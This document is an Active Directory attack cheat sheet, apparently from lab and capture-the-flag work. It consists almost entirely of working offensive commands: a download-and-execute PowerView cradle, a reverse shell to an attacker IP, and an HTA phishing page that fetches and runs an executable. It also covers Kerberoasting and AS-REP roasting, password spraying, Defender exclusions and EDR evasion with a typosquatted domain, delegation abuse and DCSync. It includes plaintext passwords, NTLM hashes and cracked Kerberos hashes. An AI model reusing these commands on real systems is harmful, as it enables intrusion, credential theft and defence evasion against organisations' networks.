# AD Cheat Sheet

Download Execute PowerView In Memory

```bash
IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.123.101:30000/PowerView.ps1")
```

User Enumeration Kerbrute

```bash
./kerbrute userenum --dc 10.0.2.10 -d remo.htb users.txt
```

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

ASREP Roasting

```bash
impacket-GetNPUsers remo.htb/ -dc-ip 10.0.2.10 -usersfile users.txt -format john -outputfile crackme.txt -no-pass -request
```

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Exploiting Force Change Password

```bash
Set-DomainUserPassword -Identity "TargetUser" -AccountPassword (ConvertTo-SecureString -AsPlainText "NewPassword123$" -Force)
```

Targeted Kerberoasting Exploiting Generic Write

```bash
Import-Module ActiveDirectory
Set-ADUser -Identity "m.nathan" -ServicePrincipalNames @{Add="http/crackme"}
```

Kerberoasting

```bash
impacket-GetUserSPNs remo.htb/'o.rashed':'MyP@ssw0rd!' -target-domain remo.htb -dc-ip 10.0.2.10 -request -request-user "m.nathan" -outputfile crackme.txt
```

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

CrackMapExec RID BruteForce

```powershell
crackmapexec smb flight.htb -u "svc_apache" -p 'S@Ss!K@*t13' --shares --rid-brute 10000
```

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

CrackMapExec Password Spraying

```powershell
crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
```

RunAs Reverse Shell

```powershell
RunasCs.exe C.Bum "Tikkycoll_431012284" -r 10.10.16.5:5353 cmd
```

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Getting Arrow keys interactive shell

```powershell
rlwrap -cAr nc -lnvp 5353
```

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

listing open port on windows machine

```powershell
netstat -ano | findstr /i LISTENING
```

chisel port forwarding.

```powershell
./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
```

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

chisel on target machine

```powershell
chisel_1.9.1_windows_amd64 client 10.10.17.43:8000 R:3389:127.0.0.1:3389
```

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Brute Forcing RID using rpcclient

```bash
for i in $(seq 500 1100); do
    rpcclient -N -U "" 10.10.10.172 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";
done
```

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

User And Password Spraying

```bash
crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
```

![](<.gitbook/assets/image (10).png>)

resetting user password using smbpasswd

```bash
impacket-smbpasswd  fabricorp.local/bhult:'Fabricorp01'@10.10.10.193 -newpass 'rem01x123$'
```

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Port one-liner

```bash
cat ports.txt | awk '{print $4}' | cut -d '/' -f 1 | sed ':a;N;$!ba;s/\n/,/g'
```

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

python script to create combination for users

```python
with open("users.txt","r") as userfile:
    with open("test.txt","w") as f:
        for user in userfile.readlines():
            user = user.strip("\n")
            user = user.lower()
            fname = user.split(" ")[0]
            lname = user.split(" ")[1]
            f.write(f"{fname}.{lname}\n{fname.capitalize()}.{lname}\n{fname}.{lname.capitalize()}\n{fname[0]}.{lname}\n{fname}.{lname[0]}\n{fname[0]}{lname}\n{fname[0]}-{lname}\n")
```

HTA Phishing

```c
<html>
<head>
<title>Hacked By Rem01x</title>
<script language="JScript">
var myshell = new ActiveXObject("Wscript.Shell");
var del = myshell.Run("powershell iwr -uri 'http://10.10.17.43/OneNote.exe' -Outfile C:\\Windows\\Tasks\\OneNote.exe;C:\\Windows\\Tasks\\OneNote.exe")
</script>
</head>
<body>
<script language="JScript">
        self.close();
</script>
</body>
</html>
```

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Checking the live hosts in internal network

```powershell
1..255 | ForEach-Object { $ip = "172.16.2.$_"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { Write-Host "Host $ip is reachable." } }
```

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

MSD Evasion Using ScareCrow

```powershell
./ScareCrow -I shell.bin -domain www.microsft.com -encryptionmode AES -obfu -url http://10.10.17.43/
```

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

```powershell
Invoke-WebRequest -Uri 'http://10.10.110.254:30000/test.txt' -OutFile 'test.txt'
```

```powershell
bitsadmin /transfer myDownloadJob /priority normal "http://10.10.110.254:30000/test.txt" "test.txt"
```

Ping Live Hosts

```powershell
fping -a -g 172.16.1.0/24
```

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Add Exception To Defender (Semi Bypass!)

```powershell
Add-MpPreference -ExclusionPath "C:\Users\Public" -ExclusionExtension ".exe"
```

Constrained Delegation

```powershell
impacket-getST -spn 'CIFS/dc.painters.htb' -impersonate 'DC$' -altservice 'cifs' -hashes :3E696480E5699AF8BAE2E99EBCFF6CD7 'painters.htb/blake' -dc-ip 192.168.110.55
export KRB5CCNAME='Administrator@cifs_dc.painters.htb@PAINTERS.HTB.ccache'
```

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

```c
$krb5tgs$23$*MBAM_DB_CAR$BERZIGROUP.LOCAL$berzigroup.local/MBAM_DB_CAR*$92762f13316436b2f54447b1813285b6$cf38e5113a92988d32f04a2f051f7266b4db657dacd60533e1c47b07e6ca4862d712dea2eefbc3d85c20648f9e36ade164009ca8f56804a3b0e8d4c4601f2d4e21df23d93a2dbbbdff809cb06bea1c6f33b24ac7c40490fcb13c455e76c6437aadf43ff020983bab5ac9f61dab16ccce7398b6bb06cda36c7f4cddc8eff8f4309a2778cab3c5851b9fe2a5073f7f88ee25fa5f44525ed2fa8b95e32a4ec60b1014bd42f1256beb8d60dc6b7df234e1a99b73f8118132cf4954e59da1ecd72c47fa0cf3d8d80f7b8bd680703ac80251b307363d7413e7e7bae86fa0271bb242f634b0315e6aa6719370a81808b33e978ed1081b16428d13b77c907eb39ef7f33276a4af3327a3d9047815ce5b85093ea8979905a08437b7d69fc737e4c8e2df8d9d8f3520560a1eae23f6bf93fe496e16dc41f43b69fade34a48213dbab63e7438cbf2afa432c550ff3db78b345d3c97b679903bf932f10461664b6cb831e2add7ac7d7d98d7d7f3efaa63f8a46e0f45d4532d337e9eda107a655a9e733d7f24a11c9f34a45aa3b0d7a07b568805fe747081bacc02e1fb107aaacc4c5ad6cb18a7648396cd60deff58a2ca1a7a6e1f53fba6a9ac1ac72744eb66f61552ff3e06fb9af3faf576b21b9e49f0366515ae05a19a3ac32c8203db53385948e67514b00fef75a05f966176791ca6b39b5a8a453b4802e8fbc6d5f90cc7625e326f22b568af68d70b02ebd3d6c6dfe7dcd0aaf610c4a7922da3c5586f90285c541a5f7256e90a4dfb35e69abc5f7af9f93b685d7fee90a7f0443041fed2cfd408dde4880c5698ceb94e7478390c3391f0afc88a418c42f47c9fdc5841e4918b8ca19aa916569e08cb5c3bcb58199ba9183c6ed9a000a61ba7c4795a1e65332a353e67d3f603cdc286e9de87b05cbcbc78746ded53fec9a6375538e1554b6c66dd4dc1d244c7c2759d243d67c4caadc9163a3956385d382279fc4f7c5edac897a2e07c23165019185619568946bfb26a4861352a1c2cf5507f872f339d4bbcc772ee6e5846a88dbdcbc0408548a0437d092d3c11282df441ea9641309876b101d926be3aabdf89d8515ee8cb356d7a938385c5543ee68b2838f4b270673f79610faf0e206a7a51570cfbb45518fc1091881adb3a9f41b64e0b93cdf9f68c104091c3529d7d20eea0642ad713086f323cd5ceea898a2cbc2738dcabaf746f3825cd555468d5b2bf834cbad605954ee00087fb84abc261f25c58b9166778848ca28f32ca480eb5884c0ce69075810dad6003b2bbd1de391a6e9961ec37c328cf0179b567b1c221c607c4769ac130090afefe4aa9fa7cfcabd567550931dbd8b2ad885d7a0d00baec0480cd0e18279643f72899a48a7e88d1cb401befc7b3180aee6ab1f13b2a871a8ab7504a13789020fd47470e4f32580b6a515ae17bb6fc8303edb948f33acafb1b05648cb49c5f8e029113edf03bba5cf4ed9b2a8a61af2b445e5f3d2145cd887a6ca61fcf85ea8234c22a1a06e6764afee21c560475b753e9d67d1374c496ec2eca7a69e155e1fa1d992fb5dac81974fcabd1a559e9a4e563fdd92:P@ssw0rd
$krb5tgs$23$*biqassso$BERZIGROUP.LOCAL$berzigroup.local/biqassso*$888983bb7c13bc4b03f6e235c53fea3f$3b0256a455499fcda7311b79c553f65f5bf03d7da25f7657ab814eddb8bd52546b818eb3b9c9ff32bfb6e0eea82f547b0fb690f37de55f550e0a476d04b5f56eb0c025fd21c8c34b390b7570156071e22b03cbba14e6307640527c502924041203a18000c0cb5a458bccdcaa6e453cf462142d42cb0f8f68c026fe5b664e12c3f75ddca5774298cd3ab12528acebec49c1f0988d3e6dde757a879b35334b31f21e419c5bf4f92582f5fe69ef568f3953231abb918fba83637e68a949e237a27b2f63e89fe51e8eeccb70d17e3325c9353a777e3cfc14a3c7a1efd90debb439479f21334cdd4303293be96ee4a3d9427e8bb4b53ad9ee4e4350b2012752647037e180f8d17167f7ac6431f41054cdd28860124992f9032ca741545da0c42964941be71194284fc0f48ca8906a09d4ab9a85c894c7a49207b39010b15b2f066376fc0d18bdf37b4827a4dc52e789a391c6d13334e427842a4631fa1e3b916955a4bfc80fd9c323583aaa0df1443b3dabbb26dd537d0f60684c1188e92fad58c2d14a0508e63bd432701edaff8046a5798c93d2c27fe79f2bbd223201cd106907daa24f27877be0d23367872e2aeb62ceed3057384106b46d30409b964a70a82c8fe0a6bb2f81714f1515c76d3bc3977c6a9f4c4eaf71d5ceb71fb39a53eae257e80082aaf3e7d43a3f7fe4d15c4864ea8bedb4995890c391d89dfef66841cccb8bd5638ee3829ab2354bb3ee488568a2b35aae7e97657915eddc8cc6b6fe5d21f115cd7e6b61ad214fc54d676611dcdbead6e0db836864dcb6f3cb87f7dfd45153df825a8e51b2995275ebb9125ce3832c3885ed15a689ce889098d998dd77f9d60202f35f4a799b9a6339db53a19eadbd7ec7bc1fb1b8c1970f2e4fbe44779fa064c4c3a8002a11117b6c86f7589e6f3d86b8103c631d194a1ef6f997361a96cf881f28f53c1d1995c8d79c647e9bb33372ec81adece1c0d2c87d083663b14b3c23782ac236091a1abd47738cb13b09b693cb6887844344ba1f6a5339074a0b370ae38072622cabd70ade77585bdb6bc31d455d5dc6c0e0616f67e1103fb32612b105a31eb400a53a065be6cd7811efdb1bfc2b65fab87bbeab9acd18ebe14b3d73891aeb5d6e9612ddcbe5bbcfe0c31b828e3ec7c21e65f097f7387e9c138ce1f63e29c885411c492f23862c0b4208a5c5668ccae4d94518846f26c1b10534d9e31a85eae818ebb1843a90be60cab16869a795a8ddd359e12f0f5a83c059bdaf1710ba8bf6ea15e8d3faf273009f0c3c6c152604eb47c986f03dd61349d1e9b7a628a835f4ce9ce2fb32c41005d6bc8d01c390a8981d09f10d3f0099c05f388d7abc0c10c1968e567194a868c63031d2a824258407235ef2226436c96980baec3453faa4411654fef33083e1d5b8b979bdb2b2075ccb9cd8a88fae4607008d43e844a4ff4a9dbfc1b03e57d414658bfb5a0880912dcc690ee3d96e5ff8bd46e5aef05b46660096802af4a03aba65870211992340e14090320d3d1e48ffba1877d99ed503b78bba3e7da37fb7ce0acb67923164cf372cb130eaab4b9dc497:P@ssw0rd
$krb5tgs$23$*bidevsso$BERZIGROUP.LOCAL$berzigroup.local/bidevsso*$18268ecd876e69bf32801a032a860758$35e33dea5b1596dc8c62f2bd7cb4197c2ba49940cff162534fca82008aff27d4476c7775f73ba896e38bf4f5a6a00f651dda71bb25b0c76cd239cccb0bd4e95a7e89896b3b1ec2eedce740415085786657ffe77e9388863f77a29bdea9ec56a4751f682fd9058b92fa217c366be71f0025891e0882a27e2197fe495f2e949a1a9da82411eb5a21aaf9ed6258c585b34ab0e61517d42989615a1064b04e6ec234493667019fbcc8c6fb51e3beae84d1437333e74d181b3a2a85218370603c2d8d9b1fbfb8e6bd9eef05f239a5418c4f867b80f14f636c26e82c2dfcaa8f14a4bc66b6536ef951a3fad720c7319f13ab316ae530a8bd80fd22a458f6ed4cc1e5a2a3198535529505bcb29ee0d901fc06079da19749a7fa425c6e68c09e213f98c42b4ff27eb8073b54814c0a80e1d4883c4942801f80ac6ad2b0ccc917eec5194b9b75b80c960f2e32928b174c3fc421d33211ca3f0357f0668ad630aee25325d43ae5c3e7f4ea639a669d3d8bfbd94d357098573f5e5ca2233c2672c0dfe232c06488144506c0898b5eea3272ae9b36d726a50d462745c2e527035911215d2563c9c4736333dae11eae97ae66d3dfcefc9cbbbb304c29917dfd2ddb5b1315d5467347e8f1454d9e4a86f36963f4e5a74338f372775593d97ca55abde2ae4b9867da54286b40546b6b3fc8f66d3f26164aedc559a1d7afae5e384e49c63bb0bdb3146010f19874e6c1d3e405a35ae95c33f562487b28a404902ac37b322f46fa690d537dc6c155216ccd1caa37ae35cc5e35c406afb5fa07c018dcde0bf57c06cf87813e17118afb551645a35d0504785af68f57160ae3ce2b8e7bbf10b17d6108ead0460c40ba1bc13ec4ee14413eeda27277a239b2090d707692e2dc8203415b91c35a0b34f0498aa9a143b61ed90bd00f7b824dfe7ddbf3eebdea835c6bd51eb2ac86b694e40c4c3ecef6552d661b2aa93ae94fec74873dd31ee3ce939d9156cf6b23873750e8dd4b1883e8ba27bcf4d819ed0dcc663e58b56efc574f57274649b940c6e549566f9bd4e13160d28c42b729b3f75b9387a183067b130540c221c09743085d5f695f0741f3603710a933ebbfab65e0f022a4db6d26c6282421a82360c5ab0ce4dccbc035a2246b6b91d743953167d7b75045702e5a496bc77c6d1f92a7e1d7b831cc26835fea48c2a291a84d22ce516711c895724e5f1c55c9d893b237e786cfb26eb1a412aeda9e8e1c2e374802e824e123c931d07a6e605b6cbc7b20eda2d5a3888dba13504a56a0ae9d17520fe33c997cf6157c6ec207b051096c8ca7593da667d6386ee5e2118a229fe4cd9ab34d062b3546771115e5348eb7549d74bab9aba068b5e74140d7b93b2cf1e6fd476d15223982498e3a00dd75bc6d291f92f0ded552e37e6b6b860bf53caadbf0f896ddf1de8e6fa1634afaef826a38b433213deef7d16d2f5c7eaab967a8fe87f07bcba0766bc4fa776ee219def6c36bf5eee3d856ebde8086d55f4905ab51eb8d76592238c46be15f5117672ed776ef8f7693b6bc9c32b88b928be2702c4fab0a777f7ac3932d85de54:P@ssw0rd
$krb5tgs$23$*biprdsso$BERZIGROUP.LOCAL$berzigroup.local/biprdsso*$534cccfedea11590c8bcd3b800f48060$b333ab68d14c8dd53442b6bdffb02bfd6f972b0f46de4338443928a3a4cb9ebfe4a9bb50e60618695155cc5c7dc4b0c05cff98e89347d53520d80875049cd0966b0ff20bf9fa6e5cf4806268c512a9faffad4b63790a7cc6dc43205649fa48f0afa4709419117ebe67f5bf83c0753bf9ed13b8be0c3e4b020c22afb27040d2f340c7a011cdfc05075dd59a865f67af17503943380698312acafdb52850e2249a9863eaa934f34a5213335a491cc7314f0ec2e27641f23722adad640f1400e99e77c5757a861e8b0c0a763ef4c1e4586507f03ade2bd92b0e885fc1ef3a476ff831fb2722f14c115ae5885f6505c00147a0cf2e415bf00218970d1d0c51afdc778a97f8783648dcf694f237fc055af9390c3b065edb5150daeb764d7928082789e503efa105b1b9be45c81364a455efbb1357dfd4f49d38a38425ddfc1915cb6ae09c26b5fb14c2f19912710122657ba6520d3463db64e7a45035f3300c5af8ebccfb1b262e683aef9c3bfe9d8a1aa50049b4f782608bbaf252056fb291deb02da48d4f3f59141b6a78510e48862a404df329bf5387928380e1a2dafe134ef28a2109fbb888542e223b2a79cbb4158786e86c02d06c305d48001a187fc411e17faf57c46d0c5167f72be7ea5491c7caf1cb75d945134c53c4538781c2d1534873ad88ccd98d1b5c73ef9af17f7edb7ddf473afa380667bfbd5340ed0aa181056f6f8d8b81b7ab073ddeeca261ff091e9e9c594def36dcc18fcae8f7ff0c6f42f4eb563f3b15d001b5e84f88f98184d788ac9c5f38fc6b168dc746e6fd3791216080ddecc50192485b8e0d589c53e114887117f43e0d9fd753812ad115fa5899b70fca0427282120af9dafe594c54a3a4da4b337afddf620578c8ce638f6cd65e7e11bf48fc2404efb80cde1d3aaf50ce65e604c8ddfe8e6baf2c228da8571958d25b938d38edb1e1879e898683a6b5d66b3e4880f7a7bad6177d7f9b2a83bd7be45b2a5581893da814ca5d565164aec30df12dd862e99ceb07a5168549afa7ad1dbd9c87fd7599285cbd722ae94c07ee0674355c8d99188de6f701703e5ab32da42161982423501f65a9365877b687b64065538edd780450564912c8ac0a73136b7ca579a71d88f09913c0f9f314c6162aef55a7edc3b2e49df255cebbefea3160fb6ed5edba63a4978316f87084b397bf3c733936c8ba19f143b711e781a517890958455b8de948bbe41c1592cf3c9ae2cc92ae9fe3c59184961ff662e76cecc306127e8811939eed70c006397a89a5ceeda8bd0ddb00e1d8a3d40d519930264575f0d99b6076d2da30b47186dfb6fa2e93c3422ec9ccab917dcfab61e30d9fffd1efa01dbf4ccfddfb35d27b6bc44b26d33b9fe25086010fd0e4c22b4437d51494c101fca0af9c87a35e437300b17d5bfee2f96224d199038eba1b32f0085648f1f0d175e2a5cbadd23bb55cc4fb671dfba71fe1fb6c1224051ae75668bc8d5c1b6ef7030e3c2036a96b2fb5503920934f8a00df5b990843198ef720460ebc2130094117b404c227cf46ad2bdbab1ca0808b408e1b4ac5f2decc83a3745:P@ssw0rd
```

Getting Ligolo Ready

```bash
sudo ip tuntap add user rem01x mode tun ligolo
sudo ip link set ligolo up
```

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Starting Ligolo

```bash
./proxy -selfcert
```

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Adding Users to interesting groups

```powershell
net localgroup administrators "PAINTERS\PNT-SVRBPA$" /add
net localgroup "Remote Management Users" "PAINTERS\PNT-SVRBPA$" /add
net localgroup "Remote Desktop Users" "PAINTERS\PNT-SVRBPA$" /add
```

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Change password using rpc

```powershell
pth-net rpc password blake -U PAINTERS/'PNT-SVRBPA$'%'ffffffffffffffffffffffffffffffff:2dfcebbe9f5f4cb3bf98032887b3d7b6' -S 192.168.110.55
```

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Find Delegation From linux

```powershell
impacket-findDelegation -target-domain painters.htb -dc-ip 192.168.110.55 painters/blake:P@ssw0rd
```

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Constrained Delegation Abuse

```powershell
impacket-getST -spn 'CIFS/dc.painters.htb' -impersonate 'administrator' -altservice 'ldap' -hashes :E19CCF75EE54E06B06A5907AF13CEF42 'painters.htb/blake'
```

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

DCSync with ticket

```powershell
impacket-secretsdump -k -no-pass dc.painters.htb
```

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

```powershell
chisel_1.9.1_linux_amd64 client 10.10.17.65:8000 R:5432:127.0.0.1:5432
```